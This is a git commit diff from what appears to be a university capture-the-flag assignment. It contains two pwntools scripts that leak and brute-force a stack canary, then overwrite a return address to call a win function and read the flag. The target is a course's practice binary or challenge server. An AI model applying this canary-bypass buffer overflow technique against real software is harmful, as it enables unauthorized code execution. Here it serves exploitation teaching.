cf64627f6a09cea365266a344ca471f80b627e33
NikoMrs <mores.nicola@gmail.com>
2024-05-14 21:51:05 +0200

    refactor comments

--- Assignment7/solution.py
+++ Assignment7/solution.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-REMOTE = True
+REMOTE = False
 
 IP_ADDRESS = "cyberchallenge.disi.unitn.it"
 PORT = 50200
@@ -10,49 +10,41 @@ if(REMOTE):
 else:
     conn = process('./bin')
 
-# Ottenuto impostando un breakpoint prima del canary, impostando set follow-fork-mode child in modo da seguire il processo figlio,
-# dandogli in pasto un pattern create 100, guardando il contenuto di rbp e infine ottenendo l'offset tramite pattern offset 0x616161616161616a
+offset = 72                 # Obtained trough GBD as usual
+win_address = 0x4011f6      # Obtianed trough GBD with p win
 
-offset = 72
-
-# Ottenuto tramite p win
-
-win_address = 0x4011f6
-
-base_payload = b"A" * offset
+base_payload = b"A" * offset        # Define a base payload that will overflow the buffer
 
 conn.recvuntil(b"3. Exit\n")
-conn.sendline(b"1")
+conn.sendline(b"1")                 # Select the echo function
 conn.recvline()
-conn.sendline(base_payload)
+conn.sendline(base_payload)         # Send the base payload. Remember that using sendLine we will append a \n at the end
 
-conn.recvuntil(b"You said: " + b"A"*offset + b"\n")     # \n aggiunto da sendline
+conn.recvuntil(b"You said: " + b"A"*offset + b"\n")     # Get all the output before the canary
 
-canary = b"\x00" + conn.recv(6)
-# for i in range(len(canary)):
-#     print(hex(canary[i]))
+canary = b"\x00" + conn.recv(6)     # Retrieve 6 bytes of canary and add the starting 0x00 to it
 
-for i in range(0xff):
+for i in range(0xff):               # Brute force the remaining byte of the canary
     conn.recvuntil(b"3. Exit\n")
-    conn.sendline(b"2")         # Choose to use toUppercase function
+    conn.sendline(b"2")                                 # Choose to use toUppercase function
 
-    payload = base_payload + canary + bytes([i])
+    payload = base_payload + canary + bytes([i])        # Append the current byte guess
     print(f"{i}-th payload: {payload}")
 
     conn.sendlineafter(b"uppercased: ", payload)
 
     crashLine = conn.recvuntil(b"Available commands")
     print(crashLine)
-    if(not (b"stack smashing detected" in crashLine)):
+    if(not (b"stack smashing detected" in crashLine)):  # If the program didn't crash, the guess is correct
         canary += bytes([i])
         print(f"Canary cracked")
         break
 
-
-payload = base_payload + canary + b"B"*8 + p64(win_address)
+# Use the previously gained info to modify the return address of the main function
+payload = base_payload + canary + b"B"*8 + p64(win_address)     # Notice the padding of size 8, due to the 64 bit system
 print(payload)
 
-conn.recvuntil(b"3. Exit\n")
+conn.recvuntil(b"3. Exit\n")            # Feed the payload to the main function and retrieve the flag
 conn.clean()
 conn.sendline(payload)
 conn.recvuntil(b"3. Exit\n")
---
+++ Assignment7/solution1.py
@@ -0,0 +1,66 @@
+from pwn import *
+
+REMOTE = False
+
+IP_ADDRESS = "cyberchallenge.disi.unitn.it"
+PORT = 50200
+
+if(REMOTE):
+    conn = remote(IP_ADDRESS, PORT)
+else:
+    conn = process('./bin')
+
+# Ottenuto impostando un breakpoint prima del canary, impostando set follow-fork-mode child in modo da seguire il processo figlio,
+# dandogli in pasto un pattern create 100, guardando il contenuto di rbp e infine ottenendo l'offset tramite pattern offset 0x616161616161616a
+
+conn.interactive()
+
+offset = 72
+
+# Ottenuto tramite p win
+
+win_address = 0x4011f6
+
+base_payload = b"A" * offset
+
+conn.recvuntil(b"3. Exit\n")
+conn.sendline(b"1")
+conn.recvline()
+conn.sendline(base_payload)
+
+conn.recvuntil(b"You said: " + b"A"*offset + b"\n")     # \n aggiunto da sendline
+
+canary = b"\x00" + conn.recv(6)
+# for i in range(len(canary)):
+#     print(hex(canary[i]))
+
+for i in range(0xff):
+    conn.recvuntil(b"3. Exit\n")
+    conn.sendline(b"2")         # Choose to use toUppercase function
+
+    payload = base_payload + canary + bytes([i])
+    print(f"{i}-th payload: {payload}")
+
+    conn.sendlineafter(b"uppercased: ", payload)
+
+    crashLine = conn.recvuntil(b"Available commands")
+    print(crashLine)
+    if(not (b"stack smashing detected" in crashLine)):
+        canary += bytes([i])
+        print(f"Canary cracked")
+        break
+
+
+payload = base_payload + canary + b"B"*8 + p64(win_address)
+print(payload)
+
+conn.recvuntil(b"3. Exit\n")
+conn.clean()
+conn.sendline(payload)
+conn.recvuntil(b"3. Exit\n")
+conn.sendline(b"3")
+
+conn.recvuntil(b"Here is the flag: ")
+flag = conn.recvline(keepends=False).decode()
+conn.close()
+print(flag)
